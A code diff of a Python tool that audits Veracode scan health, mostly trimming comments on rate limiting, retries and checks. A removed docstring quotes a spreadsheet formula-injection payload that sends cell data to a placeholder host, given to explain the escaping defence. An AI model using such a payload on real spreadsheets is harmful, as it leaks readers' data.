@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""Veracode scan health, tenant-wide. Python port of veracode/scan_health (Go v2.47)."""
+"""Veracode scan health, tenant-wide."""
 
 from __future__ import annotations
 
@@ -31,16 +31,13 @@ from openpyxl import Workbook, load_workbook
 from openpyxl.styles import Font, PatternFill, Alignment, Border, Side
 from openpyxl.utils import get_column_letter
 
-try:  # optional hardening; the stdlib parser is used when it is absent
+try:
     from defusedxml.ElementTree import fromstring as _defused_fromstring
-except ImportError:  # pragma: no cover - depends on environment
+except ImportError:  # pragma: no cover
     _defused_fromstring = None
 
 log = logging.getLogger("scan_health")
 
-# ==========================================================================
-# Constants
-# ==========================================================================
 MAX_FILE_COUNT = 10000
 MAX_MODULE_COUNT = 500
 MAX_SELECTED_MODULE_COUNT = 100
@@ -58,7 +55,6 @@ _NS_B = re.compile(rb'\sxmlns="[^"]+"')
 _DT_FMTS = ("%Y-%m-%dT%H:%M:%S%z", "%Y-%m-%dT%H:%M:%SZ", "%Y-%m-%d %H:%M:%S %Z", "%Y-%m-%d %H:%M:%S UTC")
 _URL_RE = re.compile(r'https?://\S+')
 
-# FancyList pattern lists
 JUNK_FILE_PATTERNS = ["!LICENSE*",".*","*.asmx","*.config","*.cs","*.eot","*.gif","*.ico","*.jpeg","*.jpg","*.less","*.manifest","*.map","*.markdown","*.md","*.pdf","*.png","*.properties","*.scss","*.sh","*.svg","*.ttf","*.txt","*.woff","*.xml","AUTHORS","CHANGELOG","CONTRIBUTORS","Dockerfile","LICENSE","Makefile","README","Thumbs.db"]
 THIRD_PARTY_PATTERNS = ["7z.dll","7-zip.dll","Google.*.dll","7za.exe","AutoMapper.dll","AutoMapper.*.dll","Azure.*.dll","BouncyCastle.*","Castle.Core.*","Castle.Windsor.*","componentspace.saml2.dll","Dapper.dll","Dapper.*.dll","devexpress.*","entityframework.*","Google.Protobuf.dll","gradle-wrapper.jar","GraphQL.*.dll","itextsharp.dll","log4net.dll","microsoft.*.dll","microsoft.*.pdb","!^_Microsoft.","!^_System.","!^_Azure.","newrelic.*.dll","newtonsoft.json.*","ninject.*.dll","org.eclipse.*.jar","Serilog.dll","syncfusion.*","system.*.dll","Telerik.*.dll","WebGrease.dll","phantomjs.exe","Moq.dll","ComponentSpace.SAML2.dll","^aspnet-codegenerator","sni.dll","AntiXssLibrary.dll","Antlr3.Runtime.dll","FluentValidation.dll"]
 SENSITIVE_SECRET_PATTERNS = ["*.asc","*.crt","*.gpg","*.jks","*.key","*.p7b","*.p7s","*.pem","*.pfx","*.pgp","*.p12","*.tfvars","variable.tf",".htpasswd"]
@@ -83,7 +79,6 @@ EXCESS_MSFT_PATTERNS = ["csc.exe"]
 LOOSE_CLASS_FILE = ["*.class"]; LOOSE_CLASS_MODULE = ["class files within*"]
 GRADLE_WRAPPER = ["gradle-wrapper.jar"]
 
-# Excel styling
 _HF = PatternFill("solid", fgColor="1F4E79")
 _HN = Font(bold=True, color="FFFFFF", name="Arial", size=10)
 _DF = Font(name="Arial", size=10)
@@ -94,10 +89,6 @@ _TH = Side(style="thin", color="CCCCCC")
 _BD = Border(left=_TH, right=_TH, top=_TH, bottom=_TH)
 _CLR = {"Good": "C6EFCE", "Fair": "FFEB9C", "Poor": "FFC7CE"}
 _AGE_CLR = {"<7d": "C6EFCE", "7-30d": "C6EFCE", "30-90d": "FFEB9C", "90d+": "FFC7CE", "N/A": "FFFFFF"}
-
-# ==========================================================================
-# Dataclasses
-# ==========================================================================
 
 @dataclass
 class Issue:
@@ -124,10 +115,8 @@ CHECK_CATEGORIES: dict[int, str] = {
 class FlawSummary:
     total: int = 0; fixed: int = 0; pol_aff: int = 0
     mitigated: int = 0; open_pol: int = 0; open_nopol: int = 0
-    # Open (not fixed, not mitigated) flaws by Veracode severity level.
-    # 5 = Very High, 4 = High, 3 = Medium, 2/1/0 rolled up as Low.
-    # sev_available is False when the severity breakdown could not be derived,
-    # so the dashboard can render "unknown" rather than implying zero.
+    # Open flaws by severity: 5 Very High, 4 High, 3 Medium, 0-2 Low. sev_available False means
+    # unknown, not zero.
     open_vhigh: int = 0; open_high: int = 0
     open_med: int = 0; open_low: int = 0
     sev_available: bool = False
@@ -138,7 +127,7 @@ class ScanResult:
     sandbox: str = ""; build_id: str = ""; scan_name: str = ""
     is_latest: bool = True; scan_status: str = "No Scan"
     published: str = ""; days_since: object = "N/A"; duration: str = ""
-    duration_seconds: int | None = None   # None when either date is missing
+    duration_seconds: int | None = None
     engine: str = ""; analysis_size_mb: float = 0.0
     va_score: object = ""; va_rating: str = ""
     policy_status: str = ""; policy_name: str = ""
@@ -185,7 +174,7 @@ class ScanResult:
             "Total Issues": self.total_issues,
             "Issues": self.issues_text, "Recommendations": self.recs_text,
             "Review Modules URL": self.review_url, "Triage Flaws URL": self.triage_url,
-            # Appended last so no existing column moves.
+            # Last column, so existing columns keep their position.
             "Duration (s)": self.duration_seconds,
         }
 
@@ -248,18 +237,11 @@ class AggIssue:
     description: str
     recommendation: str
 
-# ==========================================================================
-# Helpers
-# ==========================================================================
-
 _FORMULA_LEAD = ("=", "+", "-", "@", "\t", "\r")
 
 
 def _parse_retry_after(value: str | None) -> float | None:
-    """Parse a Retry-After header. RFC 9110 permits either delay-seconds or an
-    HTTP-date, and Veracode may send either, so both are handled. Returns None
-    when absent or unparseable, and clamps to a sane ceiling so a malformed or
-    hostile value cannot stall the run for hours."""
+    """Parse a Retry-After header."""
     if not value:
         return None
     v = value.strip()
@@ -280,23 +262,14 @@ def _parse_retry_after(value: str | None) -> float | None:
 
 
 def _safe_cell(v: object) -> object:
-    """Neutralise spreadsheet formula injection.
-
-    App names, module names and uploaded file names are attacker-controlled:
-    anyone able to create an app profile or upload an artifact chooses them.
-    openpyxl types a leading '=' as a real formula, so a value such as
-    =HYPERLINK("http://evil/?d="&A1,"x") executes when a reviewer opens the
-    report. Prefixing with an apostrophe forces text without altering the
-    visible value. Numbers, dates and bools are passed through untouched.
-    """
+    """Neutralise spreadsheet formula injection."""
     if isinstance(v, str) and v.startswith(_FORMULA_LEAD):
         return "'" + v
     return v
 
 
 def _si_or_none(v: Any) -> int | None:
-    """Int or None. Distinguishes 'absent' from 'zero', which matters for any
-    Veracode-supplied score where 0 is a real and very bad value."""
+    """Int or None."""
     if v is None or v == "":
         return None
     try:
@@ -330,8 +303,8 @@ def _fmt_seconds(s: int) -> str:
     return f"{m}m {sec}s" if m else f"{sec}s"
 
 def _dur_seconds(sub: str, pub: str) -> int | None:
-    """Seconds from submitted to published, or None when either date is
-    missing or the interval is negative."""
+    """Seconds from submitted to published, or None when either date is missing or the interval is
+    negative."""
     a, b = _parse_dt(sub), _parse_dt(pub)
     if a and b:
         s = int((b - a).total_seconds())
@@ -351,12 +324,7 @@ def _age_bucket(days: int | None) -> str:
     return "90d+"
 
 def _parse_module_size(size_str: str) -> int:
-    """Parse prescan module size string like '5MB', '120KB', '2GB' to bytes.
-
-    Veracode's samples show whole numbers ('15MB'), but a decimal value such
-    as '1.5MB' or '1.5 MB' must not silently count as zero, so the number is
-    parsed as a float. Unrecognised input still returns 0.
-    """
+    """Parse prescan module size string like '5MB', '120KB', '2GB' to bytes."""
     s = size_str.strip().upper()
     for suffix, mult in [("GB", 1_000_000_000), ("MB", 1_000_000), ("KB", 1_000)]:
         if s.endswith(suffix):
@@ -380,26 +348,12 @@ def _top5(items: list[str]) -> str:
     if len(items) <= 5: return ", ".join(f'"{i}"' for i in items)
     return ", ".join(f'"{i}"' for i in items[:5]) + f" and {len(items)-5} others"
 
-# ==========================================================================
-# FancyList DSL (audited against Go utils/fancy_list.go)
-# ==========================================================================
-
 def _fancy_match(filename: str, patterns: list[str]) -> bool:
-    """Test a filename against a list of patterns using the FancyList DSL.
-
-    Pattern syntax:
-      - Default: case-insensitive equality match (e.g. "readme")
-      - Single *: wildcard. "*.exe" matches suffix, "abc.*" matches prefix,
-                  "abc.*.xyz" matches prefix+suffix. Only one * allowed.
-      - ^ prefix: contains search (e.g. "^test" matches if "test" in filename)
-      - ! prefix: force case-sensitive matching for the rest of the pattern.
-                  Can combine with * or ^ (e.g. "!^_Microsoft." is case-sensitive
-                  contains, "!Test*" is case-sensitive prefix).
-    """
+    """Test a filename against a list of patterns using the FancyList DSL."""
     fn = filename.strip()
     for pat in patterns:
         p = pat
-        # ! means case-sensitive; otherwise fold to lowercase
+        # FancyList (Go utils/fancy_list.go): ! case-sensitive, ^ contains, one * wildcard.
         case_sensitive = p.count("!") == 1
         if case_sensitive:
             p = p.replace("!", "")
@@ -407,13 +361,11 @@ def _fancy_match(filename: str, patterns: list[str]) -> bool:
         else:
             f = fn.lower()
             p = p.lower()
-        # ^ means contains
         if "^" in p and p.count("^") == 1:
             p = p.replace("^", "")
             if p in f:
                 return True
             continue
-        # * wildcard (exactly one allowed)
         if p.count("*") == 1:
             if p.startswith("*"):
                 if f.endswith(p[1:]):
@@ -430,8 +382,7 @@ def _fancy_match(filename: str, patterns: list[str]) -> bool:
     return False
 
 def _fancy_match_files(files: list[dict], patterns: list[str]) -> list[str]:
-    # dict keeps first-seen order with O(1) de-duplication; a list membership
-    # test made this quadratic on uploads with thousands of matching files.
+    # dict: ordered, O(1) de-duplication on large uploads.
     found: dict[str, None] = {}
     for f in files:
         if f.get("is_ignored") or f.get("is_third_party"): continue
@@ -447,29 +398,8 @@ def _fancy_match_modules(modules: list[dict], patterns: list[str], selected_only
             found[m["name"]] = None
     return list(found)
 
-# ==========================================================================
-# Checkpointing
-# ==========================================================================
-
 class Checkpoint:
-    """Append-only JSONL checkpoint, flushed and fsync'd after every profile.
-
-    One JSON record per completed application profile. Because the record is
-    written and fsync'd before the next profile starts, a run that dies for any
-    reason (auth failure, network partition, Ctrl-C, OOM, node reboot) loses at
-    most the profile in flight. Restarting with the same checkpoint path skips
-    everything already recorded and carries the earlier rows into the report.
-
-    The format is deliberately line-oriented so a truncated final record from a
-    hard kill costs one profile rather than the whole file, and so the raw data
-    remains recoverable with jq if the workbook write itself ever fails.
-
-    Module and file rows are deliberately NOT carried here. On a 14,000-profile
-    tenant those run to millions of rows, which would exhaust memory and blow
-    past Excel's row ceiling anyway. They stream straight to CSV via
-    DetailWriter instead. What stays in memory is bounded at roughly one row
-    per profile.
-    """
+    """Append-only JSONL checkpoint, flushed and fsync'd after every profile."""
     VERSION = 2
     _KEYS = ("health", "recs", "trends", "agg")
 
@@ -496,8 +426,7 @@ class Checkpoint:
                 try:
                     rec = json.loads(line)
                 except json.JSONDecodeError:
-                    # Truncated tail from a hard kill. Costs one profile, which
-                    # will simply be re-collected on this run.
+                    # Truncated last line from a hard kill; that profile is re-collected.
                     bad += 1
                     continue
                 for k in self._KEYS:
@@ -530,7 +459,7 @@ class Checkpoint:
             try:
                 os.fsync(self._fh.fileno())
             except OSError as e:
-                # Never let a checkpoint problem take down the collection run.
+                # A checkpoint problem must never stop the run.
                 log.warning("Checkpoint fsync failed: %s", e)
             self.records_written += 1
 
@@ -544,16 +473,7 @@ class Checkpoint:
 
 
 class DetailWriter:
-    """Streams per-module and per-file rows to CSV as they are produced.
-
-    These are the only unbounded outputs in the tool: a large tenant produces
-    tens of thousands of module rows and millions of file rows. Buffering them
-    in memory to build a workbook at the end costs gigabytes and then silently
-    truncates at Excel's 1,048,576-row ceiling. Streaming to CSV keeps memory
-    flat, keeps every row, and makes the data greppable during the run.
-
-    Files are opened in append mode so a resumed run continues the same CSVs.
-    """
+    """Streams per-module and per-file rows to CSV as they are produced."""
 
     def __init__(self, base_path: str, enabled: bool = True) -> None:
         self.enabled = enabled
@@ -602,10 +522,6 @@ class DetailWriter:
             self._writers.clear()
 
 
-# ==========================================================================
-# Rate limiting
-# ==========================================================================
-
 class _Bucket:
     """One endpoint class with its own published per-minute ceiling."""
 
@@ -622,30 +538,11 @@ class _Bucket:
 
 
 class RateLimiter:
-    """Per-endpoint-class pacing against Veracode's published rate limits.
-
-    Veracode publishes three separate ceilings, all per IP address:
-        Flaw Report / Results XML APIs   80 calls/minute
-        All other XML APIs              250 calls/minute
-        All REST APIs                   500 calls/minute
-
-    A single global limiter has to be tuned for the tightest of the three, so
-    the 250/min bucket ends up running at a fraction of what it is allowed.
-    Pacing each class against its own ceiling is both faster and more accurate
-    about what is actually being consumed.
-
-    Requests within a bucket are spaced evenly rather than burst, so traffic
-    never spikes at the start of a minute window.
-
-    On a 429 the offending bucket halves its rate immediately (multiplicative
-    decrease), honours Retry-After, then recovers additively toward the
-    configured budget. Other buckets are untouched, because their ceilings are
-    independent.
-    """
+    """Per-endpoint-class pacing against Veracode's published rate limits."""
 
     LIMITS: dict[str, int] = {"report": 80, "xml": 250, "rest": 500}
 
-    # The Flaw Report and Results XML APIs share the tighter 80/min ceiling.
+    # Flaw Report and Results XML APIs share the 80/min ceiling.
     REPORT_ENDPOINTS: frozenset[str] = frozenset({
         "detailedreport.do", "summaryreport.do", "generateflawreport.do",
         "downloadflawreport.do", "detailedreportpdf.do", "summaryreportpdf.do",
@@ -653,7 +550,7 @@ class RateLimiter:
         "getsharedreportinfo.do", "getsharedreportlist.do",
     })
 
-    RECOVERY_INTERVAL = 30.0     # seconds between additive recovery steps
+    RECOVERY_INTERVAL = 30.0
 
     def __init__(self, budget_pct: float = 70.0) -> None:
         self.budget_pct = max(1.0, min(100.0, budget_pct))
@@ -675,8 +572,8 @@ class RateLimiter:
         log.debug("Rate bucket '%s' recovering to %.0f/min", b.name, b.rpm)
 
     def acquire(self, cls_name: str) -> None:
-        """Reserve the next slot in this bucket, then sleep outside the lock so
-        workers are paced without being serialised behind each other."""
+        """Reserve the next slot in this bucket, then sleep outside the lock so workers are paced
+        without being serialised behind each other."""
         b = self.buckets[cls_name]
         with self._lock:
             now = time.monotonic()
@@ -687,7 +584,6 @@ class RateLimiter:
             wait = start - now
         if wait > 0:
             time.sleep(wait)
-        # A 429 may have extended the cooldown while we were sleeping.
         while True:
             with self._lock:
                 extra = b.cooldown_until - time.monotonic()
@@ -724,55 +620,32 @@ class RateLimiter:
         return out
 
 
-# ==========================================================================
-# XML response parsers
-#
-# Split out of VeracodeClient so that a caller holding raw response bytes (the
-# single-application report reads them through its cache) parses them with
-# exactly the same code as the bulk path. The client methods are now thin
-# wrappers: fetch, then call one of these. Output is unchanged.
-# ==========================================================================
-
 def parse_xml_bytes(content: bytes) -> ET.Element:
-    """Parse an XML API response body.
-
-    Parses bytes, not text: the XML declaration is authoritative, while
-    requests' r.text falls back to charset guessing when the server sends no
-    charset, which can mis-decode non-ASCII app and file names. The default
-    namespace is stripped so element paths stay short.
-
-    Uses defusedxml when installed (defence in depth: it rejects entity
-    declarations outright). Its rejections are re-raised as ET.ParseError so
-    every caller's existing error handling applies unchanged.
-    """
+    """Parse an XML API response body."""
     body = _NS_B.sub(b"", content, count=0)
     if _defused_fromstring is None:
         return ET.fromstring(body)
     try:
         return _defused_fromstring(body)
-    except ValueError as e:      # defusedxml's DefusedXmlException family
+    except ValueError as e:
         raise ET.ParseError(f"rejected by defusedxml: {e}") from e
 
 
 def parse_build_list(root: ET.Element) -> list[dict]:
-    """getbuildlist.do: one dict per build, in response order.
-    Documented build attributes: build_id, version, policy_updated_date."""
+    """getbuildlist.do: one dict per build, in response order."""
     return [{"build_id": b.get("build_id"), "version": b.get("version", ""),
              "policy_updated_date": b.get("policy_updated_date", "")}
             for b in root.findall(".//build")]
 
 
 def parse_sandbox_list(root: ET.Element) -> list[dict]:
-    """getsandboxlist.do: sandbox id and name. Veracode entity-escapes names
-    inside the XML attribute (a "/" arrives as "&#x2f;"), so they are unescaped
-    like every other name the tool reads."""
+    """getsandboxlist.do: sandbox id and name."""
     return [{"id": s.get("sandbox_id", ""), "name": unescape(s.get("sandbox_name", ""))}
             for s in root.findall(".//sandbox")]
 
 
 def parse_build_info(root: ET.Element, bid: str | None = None) -> dict | None:
-    """getbuildinfo.do: build id, version, analysis status and published date.
-    None when the response carries no analysis_unit."""
+    """getbuildinfo.do: build id, version, analysis status and published date."""
     au = root.find(".//analysis_unit")
     if au is None: return None
     build = root.find(".//build")
@@ -783,8 +656,7 @@ def parse_build_info(root: ET.Element, bid: str | None = None) -> dict | None:
 
 
 def parse_detailed_report(root: ET.Element) -> dict | None:
-    """detailedreport.do: scan metadata, flaw summary, selected modules, SCA.
-    None when the report has no static-analysis element."""
+    """detailedreport.do: scan metadata, flaw summary, selected modules, SCA."""
     sa = root.find(".//static-analysis")
     if sa is None: return None
     fl = FlawSummary()
@@ -792,23 +664,19 @@ def parse_detailed_report(root: ET.Element) -> dict | None:
         fl.total += 1
         apc = f.get("affects_policy_compliance","false") == "true"
         is_fixed = f.get("remediation_status","") == "Fixed"
-        # Only an accepted (approved) mitigation removes a flaw from the open
-        # counts. "proposed" is awaiting review and still open, as are "none"
-        # and "rejected". Observed values: none, proposed, accepted, rejected.
+        # Only an accepted mitigation closes a flaw; proposed and rejected stay open.
         is_miti = f.get("mitigation_status","none").strip().lower() == "accepted"
         if apc: fl.pol_aff += 1
         if is_fixed: fl.fixed += 1
         elif is_miti: fl.mitigated += 1
         elif apc: fl.open_pol += 1
         else: fl.open_nopol += 1
-        # Severity breakdown of OPEN flaws only. Same XML, no extra API call.
         if not is_fixed and not is_miti:
             sev = _si(f.get("severity"), -1)
             if sev == 5: fl.open_vhigh += 1
             elif sev == 4: fl.open_high += 1
             elif sev == 3: fl.open_med += 1
             elif sev >= 0: fl.open_low += 1
-    # Only claim the breakdown is usable if we actually walked flaw elements.
     fl.sev_available = fl.total > 0
     if fl.total == 0:
         fl.total = _si(root.get("total_flaws","0"))
@@ -828,9 +696,7 @@ def parse_detailed_report(root: ET.Element) -> dict | None:
         "scan_name": unescape(sa.get("version","")), "engine": sa.get("engine_version",""),
         "submitted": sa.get("submitted_date",""), "published": sa.get("published_date",""),
         "analysis_size": _si(sa.get("analysis_size_bytes","0")),
-        # Veracode's own severity-weighted, size-adjusted score for this
-        # scan, plus policy outcome. Same response, no extra API call.
-        # Parsed defensively: absent attributes yield None, never 0.
+        # Absent attributes are None, never 0.
         "va_score": _si_or_none(sa.get("score")),
         "va_rating": (sa.get("rating") or "").strip(),
         "policy_status": unescape(root.get("policy_compliance_status","") or ""),
@@ -870,58 +736,32 @@ def parse_prescan(root: ET.Element) -> list[dict]:
     return mods
 
 
-# ==========================================================================
-# API Client
-# ==========================================================================
-
 class AuthError(Exception):
-    """Raised only when authentication cannot possibly succeed, e.g. the very
-    first call of the run fails after the full retry window. Never raised
-    mid-run: a 401 after ten hours of collection is retried, not fatal."""
+    """Raised only when authentication cannot possibly succeed, e.g. the very first call of the run
+    fails after the full retry window."""
 
 
 class TransientAuthError(Exception):
-    """A 401/403 that survived the full per-request retry window.
-
-    Deliberately NOT a requests.HTTPError, so the per-endpoint handlers below
-    do not swallow it and silently report the application as having no data.
-    It propagates to the worker, which records an explicit 'Error' row and
-    moves on to the next application."""
+    """A 401/403 that survived the full per-request retry window."""
 
 
 class XMLAPIError(requests.HTTPError):
-    """An XML API call that returned HTTP 200 with an <error> body.
-
-    Subclasses HTTPError so every handler that already catches HTTPError treats
-    it exactly like any other failed call.
-    """
+    """An XML API call that returned HTTP 200 with an <error> body."""
 
 
-# detailedreport.do's answer for a build with no published results. This is an
-# absence, not a failure (Veracode's own scan_health tool treats it the same).
+# No published results yet: an absence, not a failure (as in Veracode's tool).
 NO_REPORT_AVAILABLE = "No report available."
 
 
 class VeracodeClient:
-    """Veracode API client with request-level pacing and adaptive backoff.
+    """Veracode API client with request-level pacing and adaptive backoff."""
 
-    Pacing is applied per HTTP request, not per application. Each application
-    costs 6+ calls, so spacing only the applications leaves every call inside an
-    application unthrottled, which is what overwhelms the API on large tenants.
-
-    Authentication failures are retried with exponential backoff rather than
-    aborting. HMAC credentials are signed per request, so a 401 mid-run is
-    almost always a transient condition (credential rotation, a brief admin
-    revocation, a WAF or gateway blip). Throwing away hours of collection over
-    one of those is not an acceptable failure mode.
-    """
-
-    AUTH_RETRY_BASE = 30.0       # first backoff after a 401/403
-    AUTH_RETRY_CAP = 300.0       # ceiling on a single auth backoff
-    NET_RETRIES = 5              # connection-level retries per request
-    QUICK_NET_RETRIES = 1        # while checking a link or name (quick=True)
-    QUICK_CONNECT_TIMEOUT = 15   # seconds, quick=True only
-    QUICK_STATUS_RETRIES = 2     # 5xx retries while checking a link or name
+    AUTH_RETRY_BASE = 30.0
+    AUTH_RETRY_CAP = 300.0
+    NET_RETRIES = 5
+    QUICK_NET_RETRIES = 1
+    QUICK_CONNECT_TIMEOUT = 15
+    QUICK_STATUS_RETRIES = 2
     STATUS_RETRY = (500, 502, 503, 504)
 
     def __init__(self, region: str = "commercial", timeout: int = 120,
@@ -937,10 +777,8 @@ class VeracodeClient:
         self._s.auth = RequestsAuthPluginVeracodeHMAC()
         self._s.headers["User-Agent"] = "veracode-scan-health-py/4.0"
 
-        # No retries inside urllib3: they resend the same signed request, and
-        # a Veracode HMAC header (timestamp + nonce) is refused when replayed
-        # (seen as a 401 after a read timeout). _send retries with a fresh
-        # signature instead. 429 is left to the RateLimiter.
+        # No urllib3 retries: they resend the same HMAC header (timestamp + nonce), which Veracode
+        # refuses as a replay (401). _send re-signs every retry.
         pool = max(16, pool_size)
         self._s.mount("https://", HTTPAdapter(max_retries=Retry(0, read=False, redirect=0),
                                               pool_connections=pool, pool_maxsize=pool))
@@ -949,7 +787,6 @@ class VeracodeClient:
         self._rate_lock = threading.Lock()
         self.request_count = 0
 
-        # --- authentication retry state
         self._auth_window = max(0.0, auth_retry_window)
         self.auth_retry_events = 0
         self.auth_give_ups = 0
@@ -960,44 +797,24 @@ class VeracodeClient:
     def throttle_events(self) -> int:
         return sum(b.throttles for b in self.limiter.buckets.values())
 
-    # ------------------------------------------------------------------
-    # Transport
-    # ------------------------------------------------------------------
     def _auth_wait(self, attempt: int) -> float:
         """Exponential backoff for authentication retries, capped."""
         return min(self.AUTH_RETRY_CAP, self.AUTH_RETRY_BASE * (2 ** max(0, attempt - 1)))
 
     def _get(self, url: str, params: dict | None, bucket: str,
              auth_retry: bool = True, quick: bool = False) -> requests.Response:
-        """GET with per-bucket pacing, throttle handling, and retry on auth and
-        connection failures.
-
-        A 401/403 is retried for up to the configured window before this single
-        request is abandoned. The run itself is never abandoned: the caller
-        records the affected application as 'Error' and continues, and every
-        completed application is already durable in the checkpoint.
-
-        auth_retry=False returns a 401/403 response immediately instead. It is
-        for optional enrichment probes (Findings, Reporting API) where a 403
-        means "this account lacks the role", which no amount of waiting fixes.
-
-        quick=True is for the first lookups of a run (checking a link or a
-        name): one connection retry and a short connect timeout, so an
-        unreachable host is reported in seconds instead of minutes.
-        """
+        """GET with per-bucket pacing, throttle handling, and retry on auth and connection failures."""
         return self._send("GET", url, params, bucket, auth_retry=auth_retry, quick=quick)
 
     def _post(self, url: str, body: dict, bucket: str,
               auth_retry: bool = True) -> requests.Response:
-        """POST with the same pacing, throttle and auth handling as _get.
-        Not retried on 5xx by urllib3 (allowed_methods is GET only), which is
-        correct for a request that creates server-side state."""
+        """POST with the same pacing, throttle and auth handling as _get."""
         return self._send("POST", url, None, bucket, json_body=body, auth_retry=auth_retry)
 
     def _send(self, method: str, url: str, params: dict | None, bucket: str,
               json_body: dict | None = None,
               auth_retry: bool = True, quick: bool = False) -> requests.Response:
-        """Shared transport for _get and _post. See _get for the semantics."""
+        """Shared transport for _get and _post."""
         retries = self.QUICK_NET_RETRIES if quick else self.NET_RETRIES
         status_retries = self.QUICK_STATUS_RETRIES if quick else self._max_retries
         read = self._report_timeout if bucket == "report" else self._timeout
@@ -1013,8 +830,7 @@ class VeracodeClient:
                 r = self._s.request(method, url, params=params, json=json_body, timeout=timeout)
             except requests.RequestException as e:
                 net_attempt += 1
-                # A report that ran past the read timeout will most likely do so
-                # again: retry it once, not five times.
+                # A report past the read timeout will likely time out again: retry once.
                 limit = 1 if (bucket == "report" and isinstance(e, requests.ReadTimeout)) else retries
                 if net_attempt > limit:
                     raise
@@ -1031,7 +847,7 @@ class VeracodeClient:
 
             if r.status_code == 429:
                 self.limiter.throttled(bucket, _parse_retry_after(r.headers.get("Retry-After")))
-                continue        # re-paced at the reduced rate
+                continue
 
             if (r.status_code in self.STATUS_RETRY and method == "GET"
                     and status_attempt < status_retries):
@@ -1053,8 +869,7 @@ class VeracodeClient:
                 wait = self._auth_wait(auth_attempt)
                 body = (r.text or "")[:200]
                 if not self.first_call_done:
-                    # Nothing has ever succeeded. Credentials are probably just
-                    # wrong; fail fast instead of burning the whole window.
+                    # Nothing has succeeded yet: credentials are likely wrong, so fail fast.
                     if auth_attempt >= 3:
                         raise AuthError(
                             f"HTTP {r.status_code} from {r.url} on the first API calls of "
@@ -1092,7 +907,6 @@ class VeracodeClient:
         r = self._get(f"{self._cfg['xml']}/{ep}", params, RateLimiter.classify(ep))
         r.raise_for_status()
         root = parse_xml_bytes(r.content)
-        # The XML APIs report errors as HTTP 200 with an <error> body.
         if root.tag == "error":
             raise XMLAPIError((root.text or "").strip()[:200], response=r)
         return root
@@ -1121,9 +935,6 @@ class VeracodeClient:
             page += 1
             total_pages = (d.get("page") or {}).get("total_pages")
             if total_pages is None:
-                # Field absent: keep paging until a page comes back empty rather
-                # than assuming a single page, which would silently truncate a
-                # large tenant to the first 500 profiles.
                 continue
             if page >= total_pages: break
         total_elements = (d.get("page") or {}).get("total_elements")
@@ -1148,14 +959,7 @@ class VeracodeClient:
 
     def get_build_info(self, aid: int, bid: str | None = None,
                        sbx: str | None = None) -> dict | None:
-        """Build status and published date.
-
-        Called without a build_id, getbuildinfo.do returns the most recent scan
-        for the profile, which is what this tool wants in the overwhelming
-        majority of cases. That turns build discovery into a single request
-        instead of getbuildlist plus one getbuildinfo per build walked, and it
-        is the single largest reduction in API cost per application.
-        """
+        """Build status and published date."""
         p: dict = {"app_id": aid}
         if bid: p["build_id"] = bid
         if sbx: p["sandbox_id"] = sbx
@@ -1165,11 +969,8 @@ class VeracodeClient:
             return None
         return parse_build_info(root, bid)
 
-    # strict=True re-raises retrieval failures instead of returning an empty
-    # result, so a failed call is never mistaken for "nothing there".
-    # detailedreport's "No report available." is still None: that is an
-    # absence. The default (strict=False) behaves exactly as before.
-
+    # strict=True raises on retrieval failure so it is never read as empty; "No report available."
+    # stays None.
     def get_detailed_report(self, bid: str, strict: bool = False) -> dict | None:
         try: root = self._xml("detailedreport.do", {"build_id": bid})
         except XMLAPIError as e:
@@ -1194,16 +995,6 @@ class VeracodeClient:
             log.debug("getprescanresults.do failed: %s", e); return []
         return parse_prescan(root)
 
-    # getappinfo.do is deliberately not called. It was used only to date check
-    # #30 (scan recency) from the profile's modified_date, but detailedreport
-    # already returns the scan's published_date in a response we always fetch.
-    # Published date is also the more honest signal for "not scanned recently":
-    # modified_date moves when anyone edits the profile, which is not a scan.
-
-
-# ==========================================================================
-# Module merging
-# ==========================================================================
 
 def _merge_modules(dr_modules: list[dict], prescan_modules: list[dict]) -> list[dict]:
     by_name: dict[str, dict] = {}
@@ -1230,10 +1021,6 @@ def _merge_modules(dr_modules: list[dict], prescan_modules: list[dict]) -> list[
                 "os": dm.get("os",""), "arch": dm.get("arch","")}
     return list(by_name.values())
 
-
-# ==========================================================================
-# Individual check functions
-# ==========================================================================
 
 CheckFunc = Callable[[list[dict], list[dict], FlawSummary, dict, bool, list[str], str], tuple[list[Issue], list[str]]]
 
@@ -1284,17 +1071,14 @@ def check_03_flaw_count(files: list[dict], modules: list[dict], flaws: FlawSumma
 
 def check_04_fatal_errors(files: list[dict], modules: list[dict], _f: FlawSummary, _m: dict, _s: bool, _sc: list[str], _a: str) -> tuple[list[Issue], list[str]]:
     issues: list[Issue] = []; recs: list[str] = []
-    # 4a. missing primary debug symbols (.NET)
     fp = [m["name"] for m in modules if m["has_fatal"] and _is_dotnet(m["name"]) and not m["is_ignored"] and not m["is_third_party"] and _has_status(m, "Primary Files Compiled without Debug Symbols")]
     if fp:
         msg = f'{len(fp)} module(s) could not be scanned due to missing debug symbols (PDB): {_top5(fp)}.' if len(fp)>1 else f'Module could not be scanned due to missing debug symbols (PDB): "{fp[0]}".'
         issues.append(_chk("high", msg)); recs.append("Include PDB files for as many components as possible, especially first and second party components.")
-    # 4b. no scannable Java binaries
     fj = [m["name"] for m in modules if m["has_fatal"] and _is_java(m["name"]) and _has_status(m, "No Scannable Binaries")]
     if fj:
         msg = f'{len(fj)} Java module(s) contained no compiled Java classes: {_top5(fj)}.' if len(fj)>1 else f'Java module contained no compiled classes: "{fj[0]}".'
         issues.append(_chk("high", msg)); recs.append("Veracode requires Java apps compiled into JAR, WAR or EAR.")
-    # 4c. nested JARs
     fn = [m["name"] for m in modules if m["has_fatal"] and _is_java(m["name"]) and _has_status(m, "does not support jar files nested inside")]
     if fn:
         msg = f'{len(fn)} Java module(s) contained nested/shaded JARs: {_top5(fn)}.' if len(fn)>1 else f'Java module contained nested JARs: "{fn[0]}".'
@@ -1585,11 +1369,7 @@ def check_29_module_count(files: list[dict], modules: list[dict], _f: FlawSummar
     return issues, recs
 
 def check_30_regular_scans(files: list[dict], modules: list[dict], _f: FlawSummary, _m: dict, _s: bool, _sc: list[str], last_scan: str) -> tuple[list[Issue], list[str]]:
-    """Scan recency, measured from the published date of this scan.
-
-    Sourced from detailedreport, which is fetched anyway, so this check costs
-    no additional API call.
-    """
+    """Scan recency, measured from the published date of this scan."""
     issues: list[Issue] = []; recs: list[str] = []
     if last_scan:
         ds = _days_since(last_scan)
@@ -1603,8 +1383,7 @@ def check_31_analysis_size(files: list[dict], modules: list[dict], _f: FlawSumma
     issues: list[Issue] = []; recs: list[str] = []
     asz = scan_meta.get("analysis_size", 0)
     if asz > MAX_ANALYSIS_SIZE:
